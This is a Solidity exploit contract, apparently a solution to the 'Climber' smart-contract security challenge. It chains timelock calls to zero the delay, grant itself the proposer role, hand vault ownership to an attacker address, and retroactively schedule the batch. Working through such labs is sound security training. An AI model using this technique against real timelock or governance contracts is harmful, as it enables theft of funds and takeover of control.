// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IClimberTimelock {
	function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

	function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;
}

contract ClimberHack {

	bytes32 constant salt = keccak256("hack");
	address[] targets = new address[](4);
	uint256[] values = new uint256[](4);
	bytes[] dataElements = new bytes[](4);

	address public immutable attacker;
	address public immutable timelock;
	address public immutable vault;
	// address public immutable newImpl;

	constructor(address _attacker, address _timelock, address _vault) {
		attacker = _attacker;
		timelock = _timelock;
		vault = _vault;
	}

	function hack() public {
		targets[0] = timelock;
		values[0] = 0;
		dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));

		targets[1] = timelock;
		values[1] = 0;
		dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));

		targets[2] = vault;
		values[2] = 0;
		dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", attacker);

		// targets[3] = vault;
		// values[3] = 0;
		// dataElements[3] = abi.encodeWithSignature("upgradeTo(address)", impl);

		targets[3] = address(this);
		values[3] = 0;
		dataElements[3] = abi.encodeWithSignature("schedule()");

		IClimberTimelock(timelock).execute(targets, values, dataElements, salt);
	}

	function schedule() public {
		IClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
	}
}